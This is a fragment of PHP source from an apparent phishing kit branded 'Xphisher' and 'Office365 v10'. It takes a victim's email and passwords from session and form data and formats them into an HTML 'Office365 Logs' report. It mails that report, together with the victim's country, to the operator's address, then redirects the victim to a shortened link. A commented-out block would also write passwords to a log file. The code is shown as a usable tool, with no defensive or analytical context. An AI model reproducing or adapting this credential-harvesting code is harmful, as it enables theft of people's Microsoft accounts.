...
$Email    = $_SESSION['e'];
$Password = $_SESSION['p'];
$Password_error = $_SESSION['p_e'];
$Password_error2 = $_POST['p_e'];
		                                    ...
		                                    <tr>
		                                        <td>
		                                            <table bgcolor="#E6E6E6" border="0" cellpadding="0" cellspacing="0" style="min-width:332px;max-width:600px;border:1px solid #f0f0f0;border-bottom:0;border-top-left-radius:3px;border-top-right-radius:3px" width="100%">
		                                                <tbody>
		                                                    <tr>
		                                                        <td colspan="3" height="120px" style="font-family:Roboto-Regular,Helvetica,Arial,sans-serif;font-size:24px;color:#000000;line-height:1.25;min-width:300px"><center>💰 Office365 Logs 💰</center></td>
		                                                    ...
		                                                    <tr>
		                                                        <td>
		                                                            <table border="0" cellpadding="0" cellspacing="0" style="min-width:300px">
		                                                                <tbody>
		                                                                    <font size="4"><b>[ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Email&nbsp;&nbsp;&nbsp;&nbsp; ] = </b>'.$Email.'</font><br>
																			<font size="4"><b>[ &nbsp;Password&nbsp; ] = </b>'.$Password.'</font><br>
																			<font size="4"><b>[ Password Error ] = </b>'.$Password_error.'</font><br><br>
...
$X_SUBJECT = "Office365 v10 | ".$Email."  | ".$LOOKUP_COUNTRY;
$X_HEADERS = "From:X-Office365<Xphisher>\n";
$X_HEADERS .= "MIME-Version: 1.0\n";
$X_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
#$file = fopen("../logs.txt", "a");
#$data = "Password 2 : ".$Password_error."
#";
#fwrite($file,$data);
#fclose($file);
mail($Your_Email, $X_SUBJECT, $X_MESSAGE, $X_HEADERS);
HEADER("Location: https://bit.ly/258jMuL", true, 303);
?>
